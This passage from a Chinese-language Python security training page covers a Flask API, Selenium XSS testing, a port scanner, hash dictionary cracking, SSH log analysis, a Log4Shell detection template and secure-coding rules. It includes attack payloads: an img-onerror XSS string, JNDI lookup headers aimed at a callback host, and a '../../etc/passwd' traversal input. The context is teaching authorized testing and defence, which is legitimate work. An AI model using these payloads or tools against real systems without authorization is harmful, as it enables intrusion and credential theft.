+<div class="cblock"><div class="ctop"><span class="clang">Flask 安全工具 Dashboard</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+<pre><span class="kw">from</span> flask <span class="kw">import</span> Flask, request, jsonify, render_template_string
+<span class="kw">import</span> sqlite3, functools, hashlib, secrets
+
+app = Flask(__name__)
+app.secret_key = secrets.token_hex(<span class="nu">32</span>)   <span class="cm"># 使用加密安全的隨機密鑰</span>
+
+<span class="cm"># ─── API 認證裝飾器 ───</span>
+API_TOKEN = secrets.token_hex(<span class="nu">16</span>)
+
+<span class="kw">def</span> <span class="fn">require_token</span>(f):
+    @functools.wraps(f)
+    <span class="kw">def</span> <span class="fn">decorated</span>(*args, **kwargs):
+        token = request.headers.get(<span class="st">"X-API-Token"</span>)
+        <span class="kw">if not</span> token <span class="kw">or not</span> secrets.compare_digest(token, API_TOKEN):
+            <span class="kw">return</span> jsonify({<span class="st">"error"</span>: <span class="st">"Unauthorized"</span>}), <span class="nu">401</span>
+        <span class="kw">return</span> f(*args, **kwargs)
+    <span class="kw">return</span> decorated
+
+<span class="cm"># ─── REST API 端點 ───</span>
+@app.route(<span class="st">"/api/vulnerabilities"</span>, methods=[<span class="st">"GET"</span>])
+@<span class="fn">require_token</span>
+<span class="kw">def</span> <span class="fn">get_vulns</span>():
+    severity = request.args.get(<span class="st">"severity"</span>)
+    conn = sqlite3.connect(<span class="st">"scan_results.db"</span>)
+    <span class="kw">if</span> severity:
+        <span class="cm"># 使用參數化查詢！</span>
+        rows = conn.execute(
+            <span class="st">"SELECT * FROM vulnerabilities WHERE severity=?"</span>, (severity,)
+        ).fetchall()
+    <span class="kw">else</span>:
+        rows = conn.execute(<span class="st">"SELECT * FROM vulnerabilities"</span>).fetchall()
+    conn.close()
+    <span class="kw">return</span> jsonify([dict(zip([c[<span class="nu">0</span>] <span class="kw">for</span> c <span class="kw">in</span> conn.description], r)) <span class="kw">for</span> r <span class="kw">in</span> rows])
+
+@app.route(<span class="st">"/api/scan"</span>, methods=[<span class="st">"POST"</span>])
+@<span class="fn">require_token</span>
+<span class="kw">def</span> <span class="fn">trigger_scan</span>():
+    data = request.get_json()
+    target = data.get(<span class="st">"target"</span>)
+    <span class="cm"># 嚴格驗證輸入</span>
+    <span class="kw">import</span> ipaddress
+    <span class="kw">try</span>:
+        ipaddress.ip_address(target)    <span class="cm"># 只允許 IP 地址，防止命令注入</span>
+    <span class="kw">except</span> ValueError:
+        <span class="kw">return</span> jsonify({<span class="st">"error"</span>: <span class="st">"Invalid target"</span>}), <span class="nu">400</span>
+    <span class="cm"># 啟動異步掃描任務...</span>
+    <span class="kw">return</span> jsonify({<span class="st">"status"</span>: <span class="st">"started"</span>, <span class="st">"target"</span>: target})
+
+<span class="kw">if</span> __name__ == <span class="st">"__main__"</span>:
+    <span class="fn">print</span>(<span class="st">f"API Token: {API_TOKEN}"</span>)
+    app.run(host=<span class="st">"127.0.0.1"</span>, port=<span class="nu">5000</span>, debug=<span class="kw">False</span>)  <span class="cm"># debug=False 生產必須！</span></pre>
+</div>
+<div class="note danger"><div class="note-lbl">Flask 安全警告</div><p>Flask 開發時切勿在生產環境使用 <code>debug=True</code>，這會暴露交互式調試控制台（可執行任意 Python 代碼）。生產部署應使用 Gunicorn/uWSGI + Nginx，並在反向代理層配置速率限制和 HTTPS。</p></div>
+</div>
+
+<div class="cb" id="l3-4">
+<h2>Selenium 動態頁面爬取</h2>
+<p>許多現代 Web 應用使用 JavaScript 動態渲染（React/Vue/Angular），<code>requests + BeautifulSoup</code> 無法獲取渲染後的內容。<code>Selenium</code> 通過控制真實瀏覽器，可以爬取動態頁面，也是 Web 自動化測試和驗證 XSS/CSRF 漏洞的重要工具。</p>
+<div class="cblock"><div class="ctop"><span class="clang">Selenium 自動化安全測試</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+<pre><span class="kw">from</span> selenium <span class="kw">import</span> webdriver
+<span class="kw">from</span> selenium.webdriver.chrome.options <span class="kw">import</span> Options
+<span class="kw">from</span> selenium.webdriver.common.by <span class="kw">import</span> By
+<span class="kw">from</span> selenium.webdriver.support.ui <span class="kw">import</span> WebDriverWait
+<span class="kw">from</span> selenium.webdriver.support <span class="kw">import</span> expected_conditions <span class="kw">as</span> EC
+<span class="kw">import</span> time
+
+<span class="kw">def</span> <span class="fn">create_driver</span>(headless: bool = <span class="kw">True</span>) -> webdriver.Chrome:
+    opts = Options()
+    <span class="kw">if</span> headless:
+        opts.add_argument(<span class="st">"--headless"</span>)
+    opts.add_argument(<span class="st">"--no-sandbox"</span>)
+    opts.add_argument(<span class="st">"--disable-dev-shm-usage"</span>)
+    opts.add_argument(<span class="st">"--ignore-certificate-errors"</span>)     <span class="cm"># 忽略 SSL 錯誤</span>
+    <span class="kw">return</span> webdriver.Chrome(options=opts)
+
+<span class="cm"># ─── 自動化登入測試 ───</span>
+<span class="kw">def</span> <span class="fn">test_login</span>(url: str, username: str, password: str) -> bool:
+    driver = <span class="fn">create_driver</span>()
+    <span class="kw">try</span>:
+        driver.get(url)
+        wait = WebDriverWait(driver, <span class="nu">10</span>)
+        <span class="cm"># 等待登入表單出現</span>
+        user_field = wait.until(EC.presence_of_element_located((By.NAME, <span class="st">"username"</span>)))
+        user_field.clear()
+        user_field.send_keys(username)
+        driver.find_element(By.NAME, <span class="st">"password"</span>).send_keys(password)
+        driver.find_element(By.CSS_SELECTOR, <span class="st">'button[type="submit"]'</span>).click()
+        time.sleep(<span class="nu">2</span>)
+        <span class="cm"># 檢查是否登入成功（通過 URL 跳轉或元素出現判斷）</span>
+        <span class="kw">return</span> <span class="st">"dashboard"</span> <span class="kw">in</span> driver.current_url <span class="kw">or</span> <span class="st">"logout"</span> <span class="kw">in</span> driver.page_source
+    <span class="kw">finally</span>:
+        driver.quit()
+
+<span class="cm"># ─── XSS Payload 自動化驗證（授權測試）───</span>
+<span class="kw">def</span> <span class="fn">test_xss</span>(driver: webdriver.Chrome, url: str, param: str) -> bool:
+    <span class="st">"""測試 GET 參數是否存在反射型 XSS"""</span>
+    marker = <span class="st">"xss_marker_12345"</span>
+    payload = <span class="st">f"&lt;img src=x onerror=document.title='{marker}'&gt;"</span>
+    <span class="kw">import</span> urllib.parse
+    test_url = <span class="st">f"{url}?{param}={urllib.parse.quote(payload)}"</span>
+    driver.get(test_url)
+    time.sleep(<span class="nu">1</span>)
+    <span class="cm"># 通過頁面 title 或 alert 確認 XSS 執行</span>
+    <span class="kw">return</span> marker <span class="kw">in</span> driver.title</pre>
+</div>
+<div class="quiz"><div class="q-lbl">小測驗</div>
+<div class="q-q">使用 requests 進行 Web 安全測試時，以下哪個選項是發現敏感文件洩露的正確判斷邏輯？</div>
+<div class="q-opts">
+  <div class="qo" onclick="chkQ(this,false)"><span class="qo-k">A</span>只要 HTTP 狀態碼為 200 就認為是敏感文件洩露</div>
+  <div class="qo" onclick="chkQ(this,false)"><span class="qo-k">B</span>只要狀態碼不是 404 就認為是問題</div>
+  <div class="qo" onclick="chkQ(this,true)"><span class="qo-k">C</span>狀態碼為 200 且響應內容包含預期敏感特徵（如 <code>DB_PASSWORD</code>、<code>[core]</code> 等），才確認為真正洩露</div>
+  <div class="qo" onclick="chkQ(this,false)"><span class="qo-k">D</span>狀態碼為 403 說明文件存在但被保護，應繼續嘗試繞過</div>
+</div>
+<div class="q-exp">正確！僅判斷狀態碼容易產生誤報。例如很多網站對所有路徑返回 200（Single Page Application），但內容是 index.html 而非敏感文件。正確做法是：（1）狀態碼為 200，且（2）響應內容包含預期的敏感特徵關鍵字——如 <code>.env</code> 文件中的 <code>DB_PASSWORD=</code>，<code>.git/config</code> 中的 <code>[core]</code>，才能確認為真實洩露。這樣能大幅減少誤報，提高測試結果質量。</div>
+</div>
+</div>
+<!-- CH4 -->
+<div class="cb" id="l4-1">
+<h2>端口掃描器開發</h2>
+<p>從零開發一個完整的端口掃描器，整合前幾章所學的 Socket、多執行緒、命令行參數解析，輸出類似 nmap 的結果報告。這是將 Python 技能應用於安全工具開發的典型實踐。</p>
+<div class="cblock"><div class="ctop"><span class="clang">完整端口掃描器（pyscan.py）</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+<pre><span class="hi">#!/usr/bin/env python3
+# pyscan.py — 多執行緒端口掃描器</span>
+<span class="kw">import</span> socket, argparse, concurrent.futures, sys
+<span class="kw">from</span> datetime <span class="kw">import</span> datetime
+
+SERVICE_MAP = {
+    <span class="nu">21</span>:<span class="st">"FTP"</span>,<span class="nu">22</span>:<span class="st">"SSH"</span>,<span class="nu">23</span>:<span class="st">"Telnet"</span>,<span class="nu">25</span>:<span class="st">"SMTP"</span>,<span class="nu">53</span>:<span class="st">"DNS"</span>,
+    <span class="nu">80</span>:<span class="st">"HTTP"</span>,<span class="nu">110</span>:<span class="st">"POP3"</span>,<span class="nu">143</span>:<span class="st">"IMAP"</span>,<span class="nu">443</span>:<span class="st">"HTTPS"</span>,<span class="nu">445</span>:<span class="st">"SMB"</span>,
+    <span class="nu">3306</span>:<span class="st">"MySQL"</span>,<span class="nu">3389</span>:<span class="st">"RDP"</span>,<span class="nu">5432</span>:<span class="st">"PostgreSQL"</span>,<span class="nu">6379</span>:<span class="st">"Redis"</span>,
+    <span class="nu">8080</span>:<span class="st">"HTTP-Alt"</span>,<span class="nu">8443</span>:<span class="st">"HTTPS-Alt"</span>,<span class="nu">27017</span>:<span class="st">"MongoDB"</span>
+}
+HIGH_RISK = {<span class="nu">21</span>,<span class="nu">23</span>,<span class="nu">3306</span>,<span class="nu">3389</span>,<span class="nu">6379</span>,<span class="nu">27017</span>}  <span class="cm"># 高風險端口</span>
+
+<span class="kw">def</span> <span class="fn">scan_port</span>(args):
+    host, port, timeout = args
+    <span class="kw">try</span>:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(timeout)
+        open_ = s.connect_ex((host, port)) == <span class="nu">0</span>
+        banner = <span class="st">""</span>
+        <span class="kw">if</span> open_:
+            <span class="kw">try</span>:
+                s.sendall(<span class="st">b"\r\n"</span>)
+                banner = s.recv(<span class="nu">128</span>).decode(<span class="st">"utf-8"</span>, errors=<span class="st">"ignore"</span>).strip()
+            <span class="kw">except</span>: <span class="kw">pass</span>
+        s.close()
+        <span class="kw">return</span> port, open_, banner
+    <span class="kw">except</span>: <span class="kw">return</span> port, <span class="kw">False</span>, <span class="st">""</span>
+
+<span class="kw">def</span> <span class="fn">parse_ports</span>(port_str: str) -> list:
+    ports = []
+    <span class="kw">for</span> part <span class="kw">in</span> port_str.split(<span class="st">","</span>):
+        <span class="kw">if</span> <span class="st">"-"</span> <span class="kw">in</span> part:
+            s, e = part.split(<span class="st">"-"</span>)
+            ports.extend(range(int(s), int(e)+<span class="nu">1</span>))
+        <span class="kw">else</span>:
+            ports.append(int(part))
+    <span class="kw">return</span> ports
+
+<span class="kw">def</span> <span class="fn">main</span>():
+    p = argparse.ArgumentParser(description=<span class="st">"Python 端口掃描器"</span>)
+    p.add_argument(<span class="st">"host"</span>, help=<span class="st">"目標主機 IP"</span>)
+    p.add_argument(<span class="st">"-p"</span>, <span class="st">"--ports"</span>, default=<span class="st">"21,22,23,25,80,443,3306,3389,6379,8080"</span>)
+    p.add_argument(<span class="st">"-t"</span>, <span class="st">"--timeout"</span>, type=float, default=<span class="nu">1.0</span>)
+    p.add_argument(<span class="st">"-w"</span>, <span class="st">"--workers"</span>, type=int, default=<span class="nu">50</span>)
+    args = p.parse_args()
+
+    ports = <span class="fn">parse_ports</span>(args.ports)
+    <span class="fn">print</span>(<span class="st">f"\nPyScan — {args.host} | {len(ports)} 端口 | {datetime.now():%Y-%m-%d %H:%M}\n"</span>)
+    <span class="fn">print</span>(<span class="st">f"{'PORT':<8}{'STATE':<10}{'SERVICE':<16}{'BANNER'}"</span>)
+    <span class="fn">print</span>(<span class="st">"-"</span> * <span class="nu">60</span>)
+
+    tasks = [(args.host, p, args.timeout) <span class="kw">for</span> p <span class="kw">in</span> ports]
+    <span class="kw">with</span> concurrent.futures.ThreadPoolExecutor(max_workers=args.workers) <span class="kw">as</span> ex:
+        results = sorted(ex.map(<span class="fn">scan_port</span>, tasks), key=<span class="kw">lambda</span> x: x[<span class="nu">0</span>])
+
+    <span class="kw">for</span> port, is_open, banner <span class="kw">in</span> results:
+        <span class="kw">if</span> <span class="kw">not</span> is_open: <span class="kw">continue</span>
+        svc = SERVICE_MAP.get(port, <span class="st">"unknown"</span>)
+        risk = <span class="st">" [HIGH RISK]"</span> <span class="kw">if</span> port <span class="kw">in</span> HIGH_RISK <span class="kw">else</span> <span class="st">""</span>
+        <span class="fn">print</span>(<span class="st">f"{port:<8}{'open':<10}{svc:<16}{banner[:30]}{risk}"</span>)
+
+<span class="kw">if</span> __name__ == <span class="st">"__main__"</span>:
+    <span class="fn">main</span>()
+
+<span class="cm"># 用法：python3 pyscan.py 192.168.1.1 -p 1-1024 -w 100</span></pre>
+</div>
+</div>
+
+<div class="cb" id="l4-2">
+<h2>密碼與哈希工具開發</h2>
+<p>密碼相關工具是安全工程師的常用技能：哈希破解（字典攻擊）、密碼生成、哈希識別、彩虹表查詢——這些都可以用 Python 快速實現。</p>
+<div class="cblock"><div class="ctop"><span class="clang">哈希識別、字典爆破與密碼安全工具</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+<pre><span class="kw">import</span> hashlib, itertools, string, secrets
+
+<span class="cm"># ─── 哈希類型識別 ───</span>
+<span class="kw">def</span> <span class="fn">identify_hash</span>(hash_str: str) -> str:
+    length_map = {
+        <span class="nu">32</span>: <span class="st">"MD5"</span>, <span class="nu">40</span>: <span class="st">"SHA1"</span>, <span class="nu">56</span>: <span class="st">"SHA224"</span>,
+        <span class="nu">64</span>: <span class="st">"SHA256"</span>, <span class="nu">96</span>: <span class="st">"SHA384"</span>, <span class="nu">128</span>: <span class="st">"SHA512"</span>
+    }
+    h = hash_str.strip().lower()
+    <span class="kw">if not</span> all(c <span class="kw">in</span> string.hexdigits <span class="kw">for</span> c <span class="kw">in</span> h):
+        <span class="kw">return</span> <span class="st">"Not a hex hash"</span>
+    <span class="kw">return</span> length_map.get(len(h), <span class="st">f"Unknown ({len(h)} chars)"</span>)
+
+<span class="cm"># ─── 字典攻擊（MD5/SHA1/SHA256）───</span>
+<span class="kw">def</span> <span class="fn">dict_attack</span>(target_hash: str, wordlist_path: str) -> str:
+    <span class="st">"""使用字典文件破解哈希"""</span>
+    hash_type = <span class="fn">identify_hash</span>(target_hash)
+    algo_map = {<span class="st">"MD5"</span>: hashlib.md5, <span class="st">"SHA1"</span>: hashlib.sha1, <span class="st">"SHA256"</span>: hashlib.sha256}
+    algo = algo_map.get(hash_type)
+    <span class="kw">if not</span> algo:
+        <span class="kw">return</span> <span class="st">f"不支持的哈希類型: {hash_type}"</span>
+
+    <span class="kw">with</span> open(wordlist_path, <span class="st">"r"</span>, encoding=<span class="st">"utf-8"</span>, errors=<span class="st">"ignore"</span>) <span class="kw">as</span> f:
+        <span class="kw">for</span> i, word <span class="kw">in</span> enumerate(f):
+            word = word.strip()
+            <span class="kw">if</span> algo(word.encode()).hexdigest() == target_hash.lower():
+                <span class="kw">return</span> <span class="st">f"[+] 找到！明文: {word}（嘗試 {i+1} 次）"</span>
+    <span class="kw">return</span> <span class="st">"[-] 字典中未找到"</span>
+
+<span class="cm"># ─── 安全密碼生成 ───</span>
+<span class="kw">def</span> <span class="fn">gen_password</span>(length: int = <span class="nu">16</span>, include_symbols: bool = <span class="kw">True</span>) -> str:
+    chars = string.ascii_letters + string.digits
+    <span class="kw">if</span> include_symbols:
+        chars += <span class="st">"!@#$%^&*()-_=+"</span>
+    <span class="cm"># secrets 模組使用加密安全的隨機數生成器（CSRNG）</span>
+    <span class="kw">while</span> <span class="kw">True</span>:
+        pwd = <span class="st">""</span>.join(secrets.choice(chars) <span class="kw">for</span> _ <span class="kw">in</span> range(length))
+        <span class="cm"># 確保包含各類字符</span>
+        <span class="kw">if</span> (any(c.isupper() <span class="kw">for</span> c <span class="kw">in</span> pwd) <span class="kw">and</span>
+            any(c.islower() <span class="kw">for</span> c <span class="kw">in</span> pwd) <span class="kw">and</span>
+            any(c.isdigit() <span class="kw">for</span> c <span class="kw">in</span> pwd)):
+            <span class="kw">return</span> pwd
+
+<span class="cm"># ─── 錯誤：永遠不要用 random 生成密碼或安全 token ───</span>
+<span class="bad">import random
+token = ''.join(random.choices(string.ascii_letters, k=32))  # 偽隨機，不安全！</span>
+<span class="cm"># 正確：用 secrets.token_hex(32) 或 secrets.token_urlsafe(32)</span>
+token = secrets.token_hex(<span class="nu">32</span>)    <span class="ok"># 加密安全</span></pre>
+</div>
+</div>
+
+<div class="cb" id="l4-3">
+<h2>日誌分析自動化腳本</h2>
+<p>日誌分析是 SOC 工程師的日常工作。用 Python 自動化這個過程：從海量日誌中提取告警指標、生成統計報告、識別攻擊模式，大幅降低人工分析負擔。</p>
+<div class="cblock"><div class="ctop"><span class="clang">SSH 暴力破解日誌分析器</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+<pre><span class="kw">import</span> re, json
+<span class="kw">from</span> collections <span class="kw">import</span> Counter, defaultdict
+<span class="kw">from</span> datetime <span class="kw">import</span> datetime
+<span class="kw">from</span> pathlib <span class="kw">import</span> Path
+
+LOG_FILE = <span class="st">"/var/log/auth.log"</span>
+
+<span class="cm"># 正規表達式模式</span>
+FAIL_PATTERN  = re.compile(<span class="st">r'(\w+\s+\d+\s+\S+).*Failed password for (?:invalid user )?(\S+) from (\S+)'</span>)
+OK_PATTERN    = re.compile(<span class="st">r'(\w+\s+\d+\s+\S+).*Accepted \S+ for (\S+) from (\S+)'</span>)
+
+<span class="kw">def</span> <span class="fn">analyze_ssh_log</span>(log_path: str = LOG_FILE) -> dict:
+    fail_by_ip = Counter()
+    fail_by_user = Counter()
+    success_logins = []
+    suspicious = []
+
+    <span class="kw">with</span> open(log_path, <span class="st">"r"</span>, errors=<span class="st">"ignore"</span>) <span class="kw">as</span> f:
+        <span class="kw">for</span> line <span class="kw">in</span> f:
+            <span class="kw">if</span> m := FAIL_PATTERN.search(line):
+                ts, user, ip = m.group(<span class="nu">1</span>), m.group(<span class="nu">2</span>), m.group(<span class="nu">3</span>)
+                fail_by_ip[ip] += <span class="nu">1</span>
+                fail_by_user[user] += <span class="nu">1</span>
+            <span class="kw">elif</span> m := OK_PATTERN.search(line):
+                ts, user, ip = m.group(<span class="nu">1</span>), m.group(<span class="nu">2</span>), m.group(<span class="nu">3</span>)
+                success_logins.append({<span class="st">"ts"</span>: ts, <span class="st">"user"</span>: user, <span class="st">"ip"</span>: ip})
+
+    <span class="cm"># 識別暴力破解（>50 次失敗）</span>
+    brute_force_ips = {ip: cnt <span class="kw">for</span> ip, cnt <span class="kw">in</span> fail_by_ip.items() <span class="kw">if</span> cnt > <span class="nu">50</span>}
+
+    <span class="cm"># 危險：失敗後又有成功登入（可能已被入侵）</span>
+    bf_ips_set = set(brute_force_ips.keys())
+    compromised = [l <span class="kw">for</span> l <span class="kw">in</span> success_logins <span class="kw">if</span> l[<span class="st">"ip"</span>] <span class="kw">in</span> bf_ips_set]
+
+    result = {
+        <span class="st">"total_failures"</span>: sum(fail_by_ip.values()),
+        <span class="st">"unique_attacker_ips"</span>: len(fail_by_ip),
+        <span class="st">"top_attacker_ips"</span>: fail_by_ip.most_common(<span class="nu">10</span>),
+        <span class="st">"top_targeted_users"</span>: fail_by_user.most_common(<span class="nu">10</span>),
+        <span class="st">"brute_force_ips"</span>: brute_force_ips,
+        <span class="st">"success_logins"</span>: success_logins[-<span class="nu">20</span>:],
+        <span class="st">"potential_compromised"</span>: compromised
+    }
+
+    <span class="cm"># 輸出 JSON 報告</span>
+    <span class="kw">with</span> open(<span class="st">"ssh_analysis.json"</span>, <span class="st">"w"</span>) <span class="kw">as</span> f:
+        json.dump(result, f, ensure_ascii=<span class="kw">False</span>, indent=<span class="nu">2</span>)
+
+    <span class="fn">print</span>(<span class="st">f"總失敗次數：{result['total_failures']}"</span>)
+    <span class="fn">print</span>(<span class="st">f"暴力破解來源 IP：{len(brute_force_ips)}"</span>)
+    <span class="kw">if</span> compromised:
+        <span class="fn">print</span>(<span class="st">f"[!!! ALERT] 疑似已被入侵帳號：{[c['user'] for c in compromised]}"</span>)
+
+    <span class="kw">return</span> result</pre>
+</div>
+</div>
+
+<div class="cb" id="l4-4">
+<h2>漏洞 PoC 開發與利用框架</h2>
+<p>理解如何開發漏洞 PoC（Proof of Concept）是安全研究的核心技能。以下以 Python 展示如何開發一個結構化的漏洞驗證框架，用於授權範圍內的安全評估。</p>
+<div class="note danger"><div class="note-lbl">重要：法律與授權</div><p>PoC 開發和漏洞利用只能在<strong>明確書面授權</strong>的範圍內進行。未授權的漏洞利用是違法行為，在中國大陸受《網路安全法》和《刑法》第二百八十五條約束，可能面臨刑事追責。本節內容僅用於學習授權測試技術。</p></div>
+<div class="cblock"><div class="ctop"><span class="clang">結構化 PoC 框架（CVE 驗證模板）</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+<pre><span class="hi">#!/usr/bin/env python3
+# PoC 框架模板 — 僅用於授權安全測試</span>
+<span class="kw">import</span> requests, argparse, sys
+<span class="kw">from</span> dataclasses <span class="kw">import</span> dataclass
+<span class="kw">from</span> typing <span class="kw">import</span> Optional
+
+@dataclass
+<span class="kw">class</span> <span class="fn">VulnResult</span>:
+    target: str
+    vulnerable: bool
+    evidence: str = <span class="st">""</span>
+    remediation: str = <span class="st">""</span>
+
+<span class="kw">class</span> <span class="fn">CVE_2021_44228_Log4Shell</span>:
+    <span class="st">"""Log4Shell JNDI 注入漏洞驗證（僅探測，不利用）"""</span>
+    CVE    = <span class="st">"CVE-2021-44228"</span>
+    CVSS   = <span class="nu">10.0</span>
+    AFFECT = <span class="st">"Apache Log4j2 2.0-2.14.1"</span>
+    FIX    = <span class="st">"升級到 Log4j2 2.17.1+，或設置 log4j2.formatMsgNoLookups=true"</span>
+
+    <span class="kw">def</span> <span class="fn">check</span>(self, target: str, callback_host: str) -> VulnResult:
+        <span class="st">"""
+        探測邏輯：
+        1. 向目標發送包含 JNDI lookup 語法的 Header
+        2. 監控 callback_host 是否收到 DNS/LDAP 回調
+        3. 收到回調 = 目標解析了 lookup = 存在漏洞
+        注：完整驗證需要 OOB（Out-of-Band）回調服務（如 Interactsh）
+        """</span>
+        headers = {
+            <span class="st">"X-Api-Version"</span>: <span class="st">f"${{jndi:dns://{callback_host}/log4shell-test}}"</span>,
+            <span class="st">"User-Agent"</span>:   <span class="st">f"${{jndi:dns://{callback_host}/ua-test}}"</span>,
+        }
+        <span class="kw">try</span>:
+            r = requests.get(target, headers=headers, timeout=<span class="nu">10</span>, verify=<span class="kw">False</span>)
+            <span class="cm"># 實際判斷需要 OOB 平台（如 Interactsh / DNSLOG）確認是否收到回調</span>
+            evidence = <span class="st">f"Payload 發送成功，狀態碼 {r.status_code}。請檢查 {callback_host} 是否收到 DNS 回調"</span>
+            <span class="kw">return</span> VulnResult(target=target, vulnerable=<span class="kw">None</span>,
+                               evidence=evidence, remediation=self.FIX)
+        <span class="kw">except</span> Exception <span class="kw">as</span> e:
+            <span class="kw">return</span> VulnResult(target=target, vulnerable=<span class="kw">False</span>, evidence=<span class="st">f"請求失敗: {e}"</span>)
+
+<span class="kw">def</span> <span class="fn">main</span>():
+    p = argparse.ArgumentParser(description=<span class="st">"Log4Shell 探測工具（授權測試用）"</span>)
+    p.add_argument(<span class="st">"target"</span>)
+    p.add_argument(<span class="st">"--oob"</span>, required=<span class="kw">True</span>, help=<span class="st">"OOB 回調域名（如 xxx.interactsh.com）"</span>)
+    args = p.parse_args()
+    poc = <span class="fn">CVE_2021_44228_Log4Shell</span>()
+    result = poc.check(args.target, args.oob)
+    <span class="fn">print</span>(<span class="st">f"\n[{poc.CVE}] {poc.AFFECT}"</span>)
+    <span class="fn">print</span>(<span class="st">f"目標：{result.target}"</span>)
+    <span class="fn">print</span>(<span class="st">f"證據：{result.evidence}"</span>)
+    <span class="fn">print</span>(<span class="st">f"修復：{result.remediation}\n"</span>)
+
+<span class="kw">if</span> __name__ == <span class="st">"__main__"</span>:
+    <span class="fn">main</span>()</pre>
+</div>
+<div class="quiz"><div class="q-lbl">小測驗</div>
+<div class="q-q">在開發端口掃描器時，使用 <code>ThreadPoolExecutor(max_workers=500)</code> 掃描 1000 個端口，以下哪個問題最可能發生？</div>
+<div class="q-opts">
+  <div class="qo" onclick="chkQ(this,false)"><span class="qo-k">A</span>Python 的 GIL（全局解釋器鎖）會導致多執行緒無法真正並行，掃描速度不會提升</div>
+  <div class="qo" onclick="chkQ(this,true)"><span class="qo-k">B</span>同時打開 500 個 Socket 連接，可能耗盡本地文件描述符（file descriptor）限制，導致程序報錯</div>
+  <div class="qo" onclick="chkQ(this,false)"><span class="qo-k">C</span>threads 數量多於 CPU 核心數時，操作系統會拒絕創建新執行緒</div>
+  <div class="qo" onclick="chkQ(this,false)"><span class="qo-k">D</span>超過 100 個執行緒時，Python 自動降級為順序執行</div>
+</div>
+<div class="q-exp">正確！I/O 密集型任務（如網絡掃描）不受 GIL 影響，多執行緒確實有效。但設置過高的 <code>max_workers</code>（如 500）會同時嘗試建立 500 個 Socket 連接，容易耗盡操作系統的<strong>文件描述符</strong>限制（Linux 默認每進程 1024 個），導致「Too many open files」錯誤。合理值通常在 50-200 之間，實測找到最優平衡點。對於超大規模掃描，<code>asyncio</code> + <code>asyncio.Semaphore()</code> 是更優雅的方案。</div>
+</div>
+</div>
+
+<!-- CH5 -->
+<div class="cb" id="l5-1">
+<h2>Python 安全編碼規範</h2>
+<p>Python 開發的 Web 應用和工具本身也可能存在安全漏洞。掌握安全編碼規範，既能在滲透測試中識別代碼漏洞，也能在開發中主動規避風險。</p>
+<div class="tbl"><table class="t"><thead><tr><th>漏洞類型</th><th>危險寫法</th><th>安全寫法</th></tr></thead><tbody>
+<tr><td><strong>命令注入</strong></td><td><code>os.system(f"ping {user_input}")</code></td><td><code>subprocess.run(["ping", user_input], ...)</code></td></tr>
+<tr><td><strong>SQL 注入</strong></td><td><code>f"SELECT * WHERE id='{uid}'"</code></td><td><code>execute("SELECT * WHERE id=?", (uid,))</code></td></tr>
+<tr><td><strong>路徑遍歷</strong></td><td><code>open(f"/data/{filename}")</code></td><td><code>path = (base/filename).resolve(); assert path.is_relative_to(base)</code></td></tr>
+<tr><td><strong>不安全反序列化</strong></td><td><code>pickle.loads(user_data)</code></td><td>使用 <code>json.loads()</code>，避免 pickle 處理不可信數據</td></tr>
+<tr><td><strong>硬編碼密鑰</strong></td><td><code>SECRET_KEY = "hardcoded123"</code></td><td><code>os.environ.get("SECRET_KEY")</code> 從環境變量讀取</td></tr>
+<tr><td><strong>弱隨機數</strong></td><td><code>random.randint()</code> 用於 token</td><td><code>secrets.token_hex(32)</code></td></tr>
+<tr><td><strong>敏感信息日誌</strong></td><td><code>logging.info(f"密碼: {password}")</code></td><td>記錄脫敏後的信息，如 <code>password[:1]+"***"</code></td></tr>
+</tbody></table></div>
+<div class="cblock"><div class="ctop"><span class="clang">路徑遍歷防護示例</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+<pre><span class="kw">from</span> pathlib <span class="kw">import</span> Path
+
+BASE_DIR = Path(<span class="st">"/var/app/uploads"</span>).resolve()
+
+<span class="kw">def</span> <span class="fn">safe_read_file</span>(filename: str) -> bytes:
+    <span class="st">"""安全讀取文件，防止路徑遍歷攻擊"""</span>
+    <span class="kw">try</span>:
+        target = (BASE_DIR / filename).resolve()
+        <span class="cm"># 關鍵：確認最終路徑仍在允許目錄內</span>
+        target.relative_to(BASE_DIR)   <span class="cm"># 若不在 BASE_DIR 下，拋出 ValueError</span>
+        <span class="kw">return</span> target.read_bytes()
+    <span class="kw">except</span> ValueError:
+        <span class="kw">raise</span> PermissionError(<span class="st">f"禁止訪問路徑: {filename}"</span>)
+
+<span class="cm"># 攻擊嘗試：filename = "../../etc/passwd"</span>
+<span class="cm"># (BASE_DIR / "../../etc/passwd").resolve() = /etc/passwd</span>
+<span class="cm"># /etc/passwd.relative_to("/var/app/uploads") → 拋出 ValueError → 被阻止</span></pre>
+</div>
+</div>
+
+<div class="cb" id="l5-2">
+<h2>輸入驗證與 SQL 注入防護</h2>
+<p>輸入驗證是最基本也是最重要的安全防線。在 Python 開發中，所有來自外部的數據（HTTP 請求、命令行參數、文件內容、數據庫結果）都應被視為不可信，必須驗證和過濾後才能使用。</p>
+<div class="cblock"><div class="ctop"><span class="clang">輸入驗證最佳實踐</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+<pre><span class="kw">import</span> re, ipaddress
+<span class="kw">from</span> typing <span class="kw">import</span> Union
+
+<span class="cm"># ─── 嚴格類型與格式驗證 ───</span>
+<span class="kw">def</span> <span class="fn">validate_ip</span>(ip_str: str) -> str:
+    <span class="st">"""驗證並返回合法 IP，拒絕非法輸入"""</span>
+    <span class="kw">try</span>:
+        <span class="kw">return</span> str(ipaddress.ip_address(ip_str.strip()))
+    <span class="kw">except</span> ValueError:
+        <span class="kw">raise</span> ValueError(<span class="st">f"無效 IP 地址: {ip_str}"</span>)
+
+<span class="kw">def</span> <span class="fn">validate_port</span>(port: Union[str, int]) -> int:
+    p = int(port)
+    <span class="kw">if not</span> (<span class="nu">1</span> <= p <= <span class="nu">65535</span>):
+        <span class="kw">raise</span> ValueError(<span class="st">f"端口範圍無效: {port}"</span>)
+    <span class="kw">return</span> p
+
+<span class="kw">def</span> <span class="fn">validate_username</span>(name: str) -> str:
+    <span class="st">"""只允許字母數字和下劃線，防止注入"""</span>
